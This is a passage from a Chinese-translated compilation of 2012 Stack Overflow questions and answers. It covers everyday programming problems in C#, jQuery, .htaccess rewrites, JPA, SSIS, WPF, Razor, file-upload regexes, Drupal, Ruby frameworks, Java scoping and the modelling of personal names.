这将适用于 IE、Chrome、Safari。但是对于 Firefox，只有在单击 div 时才会激活键盘操作，而不是滚动条本身，所以这就是问题所在。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T16:21:21.857

Apparently making the div tab-able solves the problem! I simply added tabindex="0" attribute and in Firefox clicking on the scroll bar will now enable keyboard controlls.

# c# - 在二维数组上实现 LINQ 风格的扩展方法

> ID：12427204
> 
> 赞同：2
> 
> 时间：2012-09-14T15:08:08.577
> 
> 标签：c#, arrays, extension-methods

我有一些适用于二维网格（数组）的代码，最后我得到了很多循环遍历网格中每个项目的例程。

但我认为如果我可以使用扩展方法来实现这种 LINQ 风格会很好。

这是我到目前为止所尝试的：

```
private static void ForEach(this MyType[,] grid, Action<MyType> action)
{
    for (int row = 0; row < grid.GetUpperBound(0); row++)
        for (int col = 0; col < grid.GetUpperBound(1); col++)
            action(grid[row, col]);
} 
```

**1.** Intellisense 似乎无法识别类型对象上的这种扩展方法`MyType[3,3]`。我是否错过了为二维数组编写扩展方法的内容？

**2.**实现这种允许我有条件地设置网格值的模式的推荐方法是什么？使用上面的代码，设置传递的值不会影响原始数组。

**编辑：**

好的，在最初在调用它的同一个类中实现这个扩展方法之后，我愚蠢地将它声明为`private`当我将它移到外部类时。我猜它不会在同一个类中作为私有方法工作，而且它显然不会作为外部类中的私有方法工作。

不过，仍然希望看到 2 号的答案。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T15:20:01.290

对于您的第二个问题，Action 将不起作用，因为它不返回值，因此它无法直接更新数组。您可能想要的是一个`Func<MyType,MyType>`将接受原始值、进行一些处理并返回一个*新*值，然后您的 ForEach 将把它放回数组中。如果您需要知道行和列，请将其设为`Func<MyType, int, int>`.

作为旁注，我不会调用它，`ForEach`因为您正在修改基础集合（这`ForEach`在普通集合中无法做到）。我会称之为`UpdateAll`或类似的东西。

所以你最终会得到类似的东西：

```
public static void UpdateAll(this MyType[,] grid, Func<MyType,MyType> action)
{
    for (int row = grid.GetLowerBound(0); row <= grid.GetUpperBound(0); row++)
        for (int col = grid.GetLowerBound(1); col <= grid.GetUpperBound(1); col++)
            grid[row, col] = action(grid[row, col]);
} 
```

请注意，它使用`GetLowerBound`并使用`<=`而不是`<`上界检查。

# .htaccess - 如果.htaccess 可以实现这种重定向？

> ID：12427209
> 
> 赞同：1
> 
> 时间：2012-09-14T15:08:24.997
> 
> 标签：.htaccess, redirect

假设我在我的网站上有这个路径上的文件

www.mysite.com/blah/images/picture.jpg

然后我把它转移到这样的其他网站

www.my2ndsite.com/mysite/images/picture.jpg

我们可以在访问者访问 www.mysite.com 时重定向访问者以从 www.my2ndsite.com 获取图像吗

此外，如果有任何命令首先检查 www.mysite.com 上是否存在“picture.jpg”文件。如果它是真的，那么它只是不会将访问者重定向到 www.my2ndsite.com 。

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T15:12:55.950

重定向到绝对 URL：[mod_rewrite docs](http://httpd.apache.org/docs/current/mod/mod_rewrite.html#rewriterule)

检查文件是否存在：[mod_rewrite docs](http://httpd.apache.org/docs/current/mod/mod_rewrite.html#rewritecond)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T15:13:05.387

是的，您可以通过重写来做到这两点（把它放在 htaccess 中`www.mysite.com/`）：

```
RewriteEngine on
RewriteCond %{REQUEST_FILENAME} !-f
RewriteRule ^blah/images/(.+\.jpg)$ http://www.my2ndsite.com/mysite/images/$1 [L,R=301] 
```

`http://www.mysite.com/blah/images/`这会将对某些不存在的文件的任何请求重定向到`http://www.my2ndsite.com/mysite/images/`

# rest - REST PUT 方法似乎有效，但不编辑实体

> ID：12427210
> 
> 赞同：0
> 
> 时间：2012-09-14T15:08:34.540
> 
> 标签：rest, jakarta-ee, jpa

我有一个 REST Web 服务 API。我使用 JPA 映射数据库。我有一个实体“角色”。使用 POST 方法添加新实体可以正常工作，GET 方法也可以正常工作，但是当我尝试调用 PUT 方法时，我在调试时发现了一些异常：“无法抑制空异常。” 和“不允许自我抑制”。在具有其他实体的测试数据库中，一切正常...在我的情况下添加几乎与编辑一样 - 首先我只获取值，然后在更改后我做所有相同的事情，唯一的区别是使用了 PUT 方法而不是 POST。

这是我的 PUT 方法（这里发生异常）：

```
 @PUT
@Consumes({"application/xml", "application/json"})
public Response edit(Persona entity) {
    try {
        getJpaController().edit(entity);
        return Response.ok().build();
    } catch (Exception ex) {
        return Response.notModified(ex.getMessage()).build();
    }
} 
```

我是第一次使用网络服务，所以我是新手。

这种行为的原因是什么？这是什么自我抑制错误？

如果您需要其他任何源代码，请告诉我，我将编辑我的帖子。

@编辑：

我在 JpaController 类中发现了一些异常，我的 Persona 类有：

```
@OneToOne(cascade = CascadeType.ALL, mappedBy = "persona")
    private Personaacceso personaacceso; 
```

在 JpaController 中有：

```
Personaacceso personaaccesoOld = persistentPersona.getPersonaacceso();
            Personaacceso personaaccesoNew = persona.getPersonaacceso();

if (personaaccesoOld != null && !personaaccesoOld.equals(personaaccesoNew)) {
                if (illegalOrphanMessages == null) {
                    illegalOrphanMessages = new ArrayList<String>();
                }
                illegalOrphanMessages.add("You must retain Personaacceso " + personaaccesoOld + " since its persona field is not nullable.");
            } 
```

因此，显示一条消息，我必须保留 Personaacceso。知道如何解决吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T09:29:02.987

好的，我现在知道是什么原因了...

每个 Persona 实体都有一些其他实体（一对一或一对多）。Jpa 控制器没有保留所有这些包含实体（相反，它正在创建新实体）。因此，数据丢失了，并且由于该角色实体没有被编辑。

解决方案：对每个包含实体执行以下操作：

```
containedEntityNew=containedEntityOld; 
```

但是，请考虑到，这些实体字段只是从旧的“主”实体重写。

# jquery - 元素没有附加类时的事件处理程序

> ID：12427212
> 
> 赞同：1
> 
> 时间：2012-09-14T15:08:37.977
> 
> 标签：jquery, wordpress, event-handling

我需要一个附加到元素的事件处理程序，默认情况下它是不可见的。

在那里，您可以找到几个 jQuery 选项卡，而我所针对的选项卡默认情况下也是不可见的。

```
<div id="help" class="hidden">
     <div id="my-help-tab" class="hidden">
         <div class="targeted">
             <a href="#" class="show-hide">Show</a>
             <pre>test</pre>
         </div>
     </div>
</div> 
```

现在我将如何附加一个事件处理程序（`.toggle()`用于显示/隐藏），当元素*没有*类`hidden`（也是子元素）时触发？

我当前的解决方案不会在第一次触发时触发，而只会在第二次或第三次点击时触发。

```
jQuery( document ).ready( function($)
{
    $( '.targeted' ).on( 'click', function( e )
    {
        event.preventDefault();
        $( this ).children( '.show-hide' ).on( 'click', function( e )
        {
            $( this ).toggle(
                function( e ) 
                {
                    $( this ).html( 'Hide' );
                    $( this ).next( 'pre' ).toggle();
                },
                function()
                {
                    $( this ).html( 'Show' );
                    $( this ).next( 'pre' ).toggle();
                }
            );
        } );
    } );
} ); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T15:12:26.373

你可以：

```
jQuery( document ).ready( function($)
{
    $('#my-help-tab:not(.hidden) > .targeted > a').on( 'click', function( e )
    {
        event.preventDefault();
        $( this ).children( '.show-hide' ).on( 'click', function( e )
        {
            $( this ).toggle(
                function( e ) 
                {
                    $( this ).html( 'Hide' );
                    $( this ).next( 'pre' ).toggle();
                },
                function()
                {
                    $( this ).html( 'Show' );
                    $( this ).next( 'pre' ).toggle();
                }
            );
        } );
    } );
} ); 
```

或者：

```
$('#help:not(.hidden) .targeted > a') 
```

或者（但也许没有必要）：

```
$('#help:not(.hidden) > #my-help-tab:not(.hidden) > .targeted > a') 
```

另一种没有类的方法：

```
$('#my-help-tab:visible > .targeted > a') 
```

您应该阅读这些文档：

*   [后代选择器](http://api.jquery.com/descendant-selector/)
*   [子选择器](http://api.jquery.com/child-selector/)
*   [不是选择器](http://api.jquery.com/not-selector/)
*   [可见选择器](http://api.jquery.com/visible-selector/)/[隐藏选择器](http://api.jquery.com/hidden-selector/)

并阅读[此答案](https://stackoverflow.com/a/11669245/652669)以获取有关后代选择器与子选择器的更多解释。

# java - Java中类似的“处理程序”类

> ID：12427213
> 
> 赞同：6
> 
> 时间：2012-09-14T15:08:40.163
> 
> 标签：java, android, multithreading

最近学习Android，android中有一个Handler类，非常好用。我们可以将可运行对象“发布”到另一个线程的末尾，比如队列，在这种情况下它是非常动态的。任何人都知道 Java SE 中有任何类似的类能够做到这一点吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-14T15:12:03.330

`JavaSwing`有`SwingUtilities.invokeLater()`一个 Runnable 作为参数。这是在 UI Thead 上发布内容的一种方式

# jquery - Datepicker startdate/enddate 差异排除周末并填充输入

> ID：12427215
> 
> 赞同：0
> 
> 时间：2012-09-14T15:08:46.020
> 
> 标签：jquery, forms, jquery-plugins, datepicker, jquery-ui-datepicker

我正在尝试计算用户使用 datepicker 选择的开始日期和结束日期之间的天数（不包括周末）差异。

然后希望将此天数输入到#days 输入中。有人知道我哪里出错了吗？

```
// do initialization here
$("#startdate").datepicker({
            dateFormat: 'dd-mm-yy',
            changeMonth: true,
            changeYear: true,
            firstDay: 1,
            yearRange: '0:+100',
            beforeShowDay: $.datepicker.noWeekends,
            onSelect: function( selectedDate ) {
var startdate = $("#startdate").val();
var enddate =   $("#enddate").val();                
var weekend_count = 0;
                        for (i = startdate.valueOf(); i <= enddate.valueOf(); i+= 86400000){
                        var temp = new Date(i);
                            if (temp.getDay() == 0 || temp.getDay() == 6) {
                                weekend_count++;
                            }
                    }
                    $("#days").val((startdate - enddate) / 86400000 - weekend_count);
                    $( "#enddate" ).datepicker( "option", "minDate", selectedDate );
                },              
                minDate: '+1d',         
                maxDate: '+' + (DAY_DIFFERENCE + 1) + 'd'
    });

// do initialization here
$("#enddate").datepicker({
            dateFormat: 'dd-mm-yy',
            changeMonth: true,
            changeYear: true,
            firstDay: 1,
            yearRange: '0:+100',
            beforeShowDay: $.datepicker.noWeekends,
}); 
```

**编辑 - 我自己到那里，有人有任何意见吗？以下解决方案的工作方式（但我正在努力解决 php 变量 - 我如何在 php 日期函数中包含 var）。isNAN 如果适用于opera 和旧的XP 机器。**

```
 //holidays
    var natDays = [
      [1, 1, 'uk'],
      [12, 25, 'uk'],
      [12, 26, 'uk']
    ];

    function noWeekendsOrHolidays(date) {
        var noWeekend = $.datepicker.noWeekends(date);
        if (noWeekend[0]) {
            return nationalDays(date);
        } else {
            return noWeekend;
        }
    }
    function nationalDays(date) {
        for (i = 0; i < natDays.length; i++) {
            if (date.getMonth() == natDays[i][0] - 1 && date.getDate() == natDays[i][1]) {
                return [false, natDays[i][2] + '_day'];
            }
        }
        return [true, ''];
    }

// do initialization here
$("#startdate").datepicker({
            dateFormat: 'dd-mm-yy',
            changeMonth: true,
            changeYear: true,
            firstDay: 1,
            yearRange: '0:+100',
            beforeShowDay: noWeekendsOrHolidays,
            onSelect: function( selectedDate ) {
                $("#enddate").datepicker("option","minDate",selectedDate );
            },              
            minDate: '+1d',         
            maxDate: '+' + DAY_DIFFERENCE + 'd'
});

// do initialization here
$("#enddate").datepicker({
            dateFormat: 'dd-mm-yy',
            changeMonth: true,
            changeYear: true,
            firstDay: 1,
            yearRange: '0:+100',
            beforeShowDay: noWeekendsOrHolidays,
            onSelect: function( selectedDate ) {
            $d1 = $('#startdate').val();
            $d2 = $('#enddate2').val();

            console.log($d1);
            console.log($d2);

            $d1p = Date.parse($d1)
            $d2p = Date.parse($d2)

            console.log($d1p);
            console.log($d2p);

            $myDateParts1 = $d1.split("-");
            $myDateParts2 = $d2.split("-");

            console.log($myDateParts1);
            console.log($myDateParts2);

            $myNewDate1 = new Date($myDateParts1[2], $myDateParts1[1], $myDateParts1[0]);
            $myNewDate2 = new Date($myDateParts2[2], $myDateParts2[1], $myDateParts2[0]);

            console.log($myNewDate1);
            console.log($myNewDate2);

            $d1flip= $myNewDate1; 
            $d2flip= $myNewDate2; 

            console.log($d1flip);
            console.log($d2flip);

            // For Opera and older winXP IE n such
            if (isNaN($d1p)) { 
                $d1p  = Date.parse($d1flip);
            }
            if (isNaN($d2p)) { 
                $d2p  = Date.parse($d2flip);
            }

                var weekend_count = 0;
                    for (i = $d1p.valueOf(); i <= $d2p.valueOf(); i+= 86400000){
                    var temp = new Date(i);
                        if (temp.getDay() == 0 || temp.getDay() == 6) {
                            weekend_count++;
                        }
                }
                $('#days').val((Math.abs(($d2p-$d1p)/86400000) - weekend_count));
            }           
}); 
```

# sql-server-2008 - 在执行 SQL 任务查询中使用变量

> ID：12427220
> 
> 赞同：0
> 
> 时间：2012-09-14T15:08:49.600
> 
> 标签：sql-server-2008, ssis, business-intelligence, bids

就 SSIS 包而言，我是一个完整的初学者。

我真的很想执行一个存储过程，它在 foreach 循环的每次迭代中接收具有不同值的参数。所以我想知道是否有人可以给我一个例子（非常非常非常基本的例子）关于我如何在`Execute SQL Task`这样的内部使用变量作为值：

```
UPDATE tbName   SET  c1 = Var1,  C2 = Var2 etc... 
```

或者

```
@bDate = VarDate1 
@eDate = VarDate2 
```

`Var2, VarDate1, VarDate2`BIDS 中的变量在哪里

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T16:11:15.043

首先，您需要在 SQL Server 端创建存储过程。这是通过这样的声明完成的。运行此操作后，数据库中将存在一个名为“yourProcedure”的新存储过程对象。

```
CREATE PROCEDURE yourProcedure
   @pKeyVar int,                 /* declare variables to be passed here */
   @pFirstVar varchar(40), 
   @pSecondVar int,
   @pThirdVar decimal(18,2)
AS 
BEGIN

   Update yourTable Set          /* place what will be done here */
       Col1 = @pFirstVar, 
       Col2 = @pSecondVar, 
       Col3 = @pThirdVar 
   WHERE KeyColumn = @pKeyVar

END
GO 
```

创建存储过程后，您可以像这样调用它：

```
exec dbo.yourProcedure 12345, 'string value', 2, 2.05 
```

有几种方法可以从 SSIS 调用它，但最常见的是`Execute SQL Task`. 您可以将要传递的参数映射到保存内容的变量，并将任务放入循环逻辑中。

[这是执行 SQL 任务的一个不错的演练。](http://www.sqlis.com/post/The-Execute-SQL-Task.aspx)

密切关注映射参数到变量等部分。SSIS 的版本是 2005，但概念都是相同的。

* * *

评论后更新。

为了遍历记录集并获取值以传回 proc，您可以按照[本文中提供的信息进行操作。](http://sqlblog.com/blogs/eric_johnson/archive/2009/11/13/ssis-2008-looping-through-rows-in-a-table.aspx)

# c# - 从本地目录中删除位图

> ID：12427224
> 
> 赞同：1
> 
> 时间：2012-09-14T15:08:56.803
> 
> 标签：c#, wpf, bitmap

好吧，事情已经到了这个地步。我在许多其他网站中搜索了这个网站，似乎没有人能给我一个直接的答案，所以我将尝试直接询问。在这个问题上呆了大约 3 天，我不能再浪费时间了。

**目标：**我正在构建的应用程序在 WPF 中，并将用作我的设计团队和我将很快开展的项目的错误跟踪器。由于我们将使用 C++ 构建游戏，因此发生的大多数错误都会对它们具有视觉元素，因此我包含了在用户将错误添加到列表时提供相关错误图像的功能。然后我拍摄该图像并将其保存到本地目录（用于测试）。现在，Error 对象中的图像路径指向了通向本地目录的路径。此功能已经过测试并且工作正常。当我想从列表中删除一个错误时，我的问题就出现了。我收到了那个非常臭名昭著的“IO Exception”，说我要删除的图像正在被另一个进程使用。

**到目前为止：**起初我尝试了非常优雅的解决方案，但是对于所有事情，您都只是想看看您是否可以让事情甚至工作。所以我现在使用的大部分代码都是实验性的和激进的。因此，请在查看时注意所使用的代码是出于绝望，因此可能已经尝试过任何“简单”的解决方案（我确实对此进行了很多研究，因为我讨厌这样做）。我能想到的事情是荒谬的处置和强制垃圾收集被调用，所以请不要评论这种做法的负面性质，我很清楚:)。

**编码**

*将图像保存到本地目录*

```
public void OnBrowseClick()
    {
        Microsoft.Win32.OpenFileDialog openBox = new Microsoft.Win32.OpenFileDialog();

        // Show dialog box to user and grab output
        Nullable<bool> result = openBox.ShowDialog();

        if (result == true)
        {
            // Create temp variable to hold local path string
            string localPath = Directory.GetCurrentDirectory();      

            // Grab the extension of the specified file path
            string extension = openBox.FileName.Substring(openBox.FileName.LastIndexOf("\\"));

            // Add extension to local path
            localPath += extension;

            // Create local copy of image at given file path (being ridiculous at this point)
            using (Stream stream = new FileStream(openBox.FileName, FileMode.Open, FileAccess.ReadWrite))
            {
                using (Bitmap bmp = LoadImage(stream))
                {
                    using (Bitmap temp = (Bitmap)bmp.Clone())
                    {
                        temp.Save(localPath);
                        temp.Dispose();
                    }

                    bmp.Dispose();
                }

                stream.Dispose();
            }

            // Set the URL in the image text box (UI stuff)
            LocalError.ImagePath = localPath;   
        }
    } 
```

*下面是上面函数中用到的**LoadImage**函数*

```
private Bitmap LoadImage(Stream stream)
    {
        Bitmap retval = null;

        using (Bitmap bitmap = new Bitmap(stream))
        {
            retval = new Bitmap(bitmap.Width, bitmap.Height, bitmap.PixelFormat);

            using (Graphics gdi = Graphics.FromImage(retval))
            {
                gdi.DrawImageUnscaled(bitmap, 0, 0); 
                gdi.Flush();
                gdi.Dispose();
                bitmap.Dispose();
            }
        }

        // Garbage collection here to be safe
        GC.WaitForPendingFinalizers();
        GC.Collect();

        return retval;
    } 
```

*最后我们来到我尝试**删除**图像的地方*

```
public void OnDeleteClick()
    {
        // Ask user to make sure they want to delete selected item(s)
        MessageBoxResult result = MessageBox.Show("Are you sure you want to delete selected item(s) from the list?",
                                "Delete", MessageBoxButton.YesNo);

        if (result == MessageBoxResult.Yes)
        {
            for( int i = 0; i < Parent.ErrorListControl.ErrorDataGrid.SelectedItems.Count; ++i)
            {
                // Get path to image
                string path = (Parent.ErrorListControl.ErrorDataGrid.SelectedItems[i] as Error).ImagePath;

                // Even tried calling garbage collection here!!!!!
                System.GC.WaitForPendingFinalizers();
                System.GC.Collect();
                File.Delete(path);

                // Remove the error from the error list
                Parent.ErrorListVM.ErrorList.Remove((Error)Parent.ErrorListControl.ErrorDataGrid.SelectedItems[i]);

                // Decrement counter because we altered the list while in a loop
                i--;
            }
        }
    } 
```

**注意：**如果有人希望我进一步解释任何事情，或者如果您需要知道我遗漏的内容，请询问我会尽快回复您！在这一点上，任何建议都是有帮助的，我绝对不知道我做错了什么。我通常只在 C++ 环境中编程，所以我倾向于管理我自己的内存，这整个“垃圾收集”的事情真的给我们的项目带来了麻烦！（题外话：我不知道为什么我没有得到任何颜色突出显示，所以我向任何花时间阅读本文的人道歉）。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T15:40:00.500

既然您的`LoadImage`方法只是简单地复制图像，为什么不使用`File.Copy(source, dest)`并避免使用所有的位图、绘图等呢？您的目标可能是在创建本地位图后对其进行修改，但在复制后仍然可以完成。

此外，在使用`using`块时，`.Dispose()`不需要显式，因为`using`块会为您执行此操作：

```
using (var obj = new SomeDisposableObject())
{
    // code here
    // obj.Dispose(); <-- not needed, since...
} // ...at this point obj.Dispose is called automatically. 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T15:44:57.973

Here's a simple way to do what you want. In this example, I'm using Path.GetTempFileName() to generate a random file name in the local user's temp directory. If you don't need to persist the files then it's a good place to store them temporarily. Also, the user could theoretically import two files with the same name. So you want to use some kind of random filename generation or other mechanism to avoid conflicts.

```
private void browseButton_Click(object sender, RoutedEventArgs e)
{
    var openFileDialog = new Microsoft.Win32.OpenFileDialog();

    if (openFileDialog.ShowDialog(this) == true)
    {
        using (Bitmap originalImage = new Bitmap(openFileDialog.FileName))
        {
            string tempFileName = System.IO.Path.GetTempFileName();

            originalImage.Save(tempFileName);

            // LocalError.LocalPath
            LocalPath = tempFileName;
        }
    }
}

private void deleteButton_Click(object sender, RoutedEventArgs e)
{
    if (File.Exists(LocalPath))
    {
        File.Delete(LocalPath);
    }
} 
```

Although a simple File.Copy should suffice as long as you have the right paths, I was just providing a solution that matched your question.

**EDIT:** Actually the current directory does not seem to be changed by the OpenFileDialog. I could swear that it did at some point. So I don't think this is your problem. Regardless, this code still works for me and you shouldn't require anything more complicated than this.

**EDIT #2:** It seems the lock is actually caused by the image being databound to the view and presumably locked by the BitmapSource. You should be able to create it without locking the file. Generally, this is slower so don't do it this way unless you need to be able to modify or delete the file.

```
bitmapSource = new BitmapImage();
bitmapSource.BeginInit();
bitmapSource.CacheOption = BitmapCacheOption.OnLoad;
bitmapSource.CreateOption = BitmapCreateOptions.IgnoreImageCache;
bitmapSource.UriSource = new Uri(ImagePath, UriKind.Absolute);
bitmapSource.EndInit(); 
```

# asp.net - 那么这是否意味着没有 MVC 的 RAZOR 甚至不能做事件处理程序的东西？

> ID：12427227
> 
> 赞同：0
> 
> 时间：2012-09-14T15:08:58.673
> 
> 标签：asp.net, razor

我是 RAZOR 的新手，现在我需要在用户单击按钮时触发一个事件，这样我就可以运行一行代码来处理该事件。

我不想将它与**MVC**一起使用，也不想使用**JavaScript**，因为我只想探索 RAZOR 的强大功能。

当有人告诉我事件驱动方法的方式已经在 RAZOR 中被丢弃时，我感到很惊讶，没关系。但我的问题是

**处理/响应单击事件（在 RAZOR 语法中）的方法是什么，这是 ASP.NET Web 窗体应用程序中最简单的事情？**

我问这个问题的原因是我发现即使是最简单的事情，比如我想写一段代码来响应用户的输入也很难做到（或者我应该说没有办法做到）在剃刀。

你可以看看我之前帖子中的讨论。 [ASP.NET RAZOR 无法捕获事件](https://stackoverflow.com/questions/12423932/asp-net-razor-cannot-capture-the-event)

我希望有一些人可以指导我迈出艰难的第一步。

谢谢。

**更新：如果没有 MVC 框架的帮助，似乎真的没有办法以任何方式处理用户事件。谢谢你们的回答。我想再把这篇文章留几天，希望我能看到有人发布一些有趣的东西。再次感谢你。**

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T15:16:40.943

Razor中**没有点击事件之类的东西。**

事件处理是 WinForms 中使用的一个概念。经典 ASP.NET WebForms 中的事件模型是将 Windows 编程模型转换为 Web 的努力，坦率地说，这并没有很好地工作。有状态的事件模型和 Web 编程几乎是相互矛盾的。

如果您想处理事件，请使用经典的 ASP.NET WebForms。如果你想拥抱网络而不是反对它，学习 ASP.NET MVC、Razor 等。

不要试图在无状态基础设施上安装有状态遗留范式。这就是微软对 WebForms 所做的事情，这也是它应该保留的地方。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T15:12:04.593

Razor 仅适用于 ASP.NET MVC。您不能将它与 WebForms 模型一起使用，尽管有些人将这两者混合在一些[高级且混乱的场景中。](http://www.hanselman.com/blog/MixingRazorViewsAndWebFormsMasterPagesWithASPNETMVC3.aspx)这不是你想要的。

# asp.net - 如何在正则表达式 Asp.net 中限制某些文件类型并允许所有其他文件类型

> ID：12427234
> 
> 赞同：0
> 
> 时间：2012-09-14T15:09:07.690
> 
> 标签：asp.net, regex, file-upload

我想限制少数文件类型格式并允许所有其他文件类型在正则表达式验证表达式中。我尝试的是指定一些允许和一些受限制的文件类型，但我想指定受限制的文件类型并允许上传所有其他类型。

我正在使用带有 asp.net 文件上传控制的正则表达式。我的正则表达式现在看起来像这样

```
^.*\.(csv|xlsx|xls|doc|docx|pdf|txt|zip|(?!exe)|(?!bat)|(?!msi))$ 
```

它工作正常并限制 exe bat 和 msi 但我想允许所有其他文件格式

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T15:26:51.017

使用否定的向后看：

```
/^.*(?<!\.(exe|bat|msi))$/i 
```

您使用的负前瞻对您没有帮助。完全没有。它们是微不足道的，因为您试图在字符串的末尾匹配它们，并且环视不会消耗任何东西，因此字符串中的最后一个位置不能有 exe 或 bat 。

为了后代，一步一步的解释：

```
^ 
```

匹配字符串的开头，我相信你知道。

```
.* 
```

消耗整个字符串。

```
(?<! ... ) 
```

回头看看，确保我们没有消费......

```
\. 
```

一个字面点，后跟...

```
(exe|bat|msi) 
```

我们的任何禁止文件类型。

```
$ 
```

然后匹配字符串的结尾。

我还选择让它不区分大小写。

编辑，对于 js：

```
/^(?:(?!\.(exe|bat|msi)$).)*/i 
```

Moar不同的解释：

```
^ 
```

字符串顶部

```
( 
```

开始组

```
. 
```

任意字符

```
(?!...) 
```

负前瞻。不跟随：

```
\. 
```

字面点。

```
(exe|bat|msi) 
```

禁止的文件类型。

```
$ 
```

字符串结束

)*

关闭组并匹配任意次数。

# jquery-ui - 在我的 Drupal 站点上包含 .js 文件

> ID：12427235
> 
> 赞同：0
> 
> 时间：2012-09-14T15:09:11.363
> 
> 标签：jquery-ui, drupal-6

我想`jQueryUI Autocomplete`在我的`Drupal`网站上使用，我下载了`.js`它运行所需的文件。之后，我将`.js`文件保存在位于`/sites/all/themes/advanced/js`. 在我`page.tpl.php`的里面有这段代码，

```
<head>
    <?php print $head ?>
    <title><?php print $head_title ?></title>
    <?php print $styles ?>  
    <?php print $scripts ?>
    <?php print phptemplate_get_scripts(); ?>
    <?php if ($user->uid) print phptemplate_get_scripts_advanced(); ?>
    <!--[if lt IE 7]>
      <?php print phptemplate_get_ie_styles(); ?>
    <![endif]-->
</head> 
```

使用上面的代码，我假设我的`.js`文件将被包含，但是当我重新加载页面并通过检查正在运行的脚本时`Firebug`，我找不到它们。我错过了什么？提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T16:07:11.413

知道了。我确实尝试将我的脚本手动放在我的身上`template.php`并解决了它。:)

# python - 是否有适用于 ruby 的轻量级框架，例如适用于 python 的 web.py？

> ID：12427237
> 
> 赞同：1
> 
> 时间：2012-09-14T15:09:11.567
> 
> 标签：python, ruby

我最近看到越来越多的关于更轻量级的 Web 框架 - 主要用于 python (flask, web.py) 。

我只是好奇红宝石是否有类似的东西。我在旅行中还没有发现任何东西，但也许我没有在正确的地方旅行。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-09-14T15:15:47.557

如果你想要一个轻量级的 ruby​​ web 框架，你应该使用[Sinatra 。](http://www.sinatrarb.com/)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-14T15:22:26.773

如果您正在寻找构建类似*REST 的 API* ，请查看[Grape](https://github.com/intridea/grape)。[这是](http://armoredcode.com/blog/build-an-api-for-fun-with-grape/)一个很好的入门。

 ** * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-14T15:30:25.240

[露营](https://camping.github.io/camping.io/)很好，尽管有点……特别。 [Ramaze](http://ramaze.net/)可以*非常*轻巧。哦，我应该补充一点，根据您对轻量级的定义，您*可以*[在 Rails](https://gist.github.com/1942658)中构建轻量级应用程序。*

# java - Java中的名称范围

> ID：12427239
> 
> 赞同：2
> 
> 时间：2012-09-14T15:09:15.987
> 
> 标签：java

一个朋友告诉我这是一个学习 Java 作用域的好例子，但我不明白。

是什么`a`？我完全迷路了！

```
public class scopesexample {

    public static a a = new a<a>(a(new a()));

    public static class a<a> {
        a a;

        public a() {
            this.a = a(a(null));
        }

        public a(a a) {
            this.a = a;
        }

        public a a(a a) {
            return a;
        }

        public String toString() {
            return "a";
        }
    }

    public static a a(a a) {
        return new a<a>(a);
    }

    public static void main(String[] args) {
        System.out.println( a );
        System.out.println( a( a ) );
        System.out.println( a.a );
        a<a> a = new a<a>(a(new a()));
        System.out.println(a.a( a ));
        System.out.println( a );
        System.out.println( a );
        System.out.println(a.class);
        System.out.println(a.getClass());
        System.out.println(a.a);
        System.out.println(a( a ));
        System.out.println(a( a ).a);
    }
} 
```

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-09-14T15:12:48.513

我的建议是忽略你的朋友。

他或她要么把你清盘，要么他或她不知道学生如何学习示波器。

首先，通过`a`同时使用类、方法和变量名，他违反了代码风格准则和常识。

第二个问题是他在理解作用域的问题中加入了理解命名空间的问题，这是不必要的，而且是混乱的。

# algorithm - 处理蒙古语姓名

> ID：12427240
> 
> 赞同：8
> 
> 时间：2012-09-14T15:09:21.460
> 
> 标签：algorithm, parsing, culture, countries

有几个国家（土耳其、蒙古、吉尔吉斯斯坦等）一般男性的名字可以没有中间名，而是使用“oglu、uulu”等词。

例如“Michael oglu Bret”，意思是“布雷特的迈克尔之子”。

我曾经把这种词分开并假设它们是一个中间名，所以在过去的一周里，我对我这样做的方式的正确性感到怀疑。

是否有任何标准化或一些规则来处理这种名称？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-14T15:53:56.677

我不能告诉你什么最适合你，但总的来说，中间名的概念并不能很好地映射到许多文化中。即使在西方（欧洲和北美），它最终造成的问题也多于解决的问题。最好放弃中间名，只使用两个字段作为名称：GivenNames 和 FamilyNames。在每个字段中，您必须允许名称包含多个名称单词，并允许名称很长。给定的名字是给孩子作为个人的名字，即个人名字，而姓氏是来自家庭和/或氏族的名字。通常，我们西方认为的名字和中间名是给定的名字，而姓氏是姓氏。

例如，西班牙裔命名约定是有两个姓氏——父姓和母姓。问题在于，习惯于一个名字、一个中间名和一个姓氏概念的数据输入人员会将其中一个姓氏放在中间名槽中，这是不正确的。

阿拉伯名称遵循类似于您在问题中描述的约定（请参阅[http://en.wikipedia.org/wiki/Arabic_name#Arab_family_naming_convention](http://en.wikipedia.org/wiki/Arabic_name#Arab_family_naming_convention)）。在给定/家庭模型中，诸如“Saleh ibn Tariq ibn Khalid al-Fulan”（Saleh，Tariq 的儿子，Khaled 的儿子；al-Fulan 家族的儿子）之类的名字会将“Saleh”映射到给定的名字，并且“ ibn Tariq ibn Khalid al-Fulan”改为姓氏。但是，如果这些类型的名称都是您的系统将处理的，您可能会使用三个字段：名字/个人姓名、父亲姓名和家庭/氏族名称。只有一个名称字段是另一种选择。

最大的问题是让数据输入人员在与来自不同文化和命名约定的人打交道时一致且正确地映射名称。似乎无论您选择哪种模型来存储名称，它们都会错误地输入来自命名约定与自己不同的文化的名称。在编写名称查找时，这需要更多的编程工作来解决这个现实。

该网页讨论了许多与名称相关的问题：

[http://www.w3.org/International/questions/qa-personal-names](http://www.w3.org/International/questions/qa-personal-names)

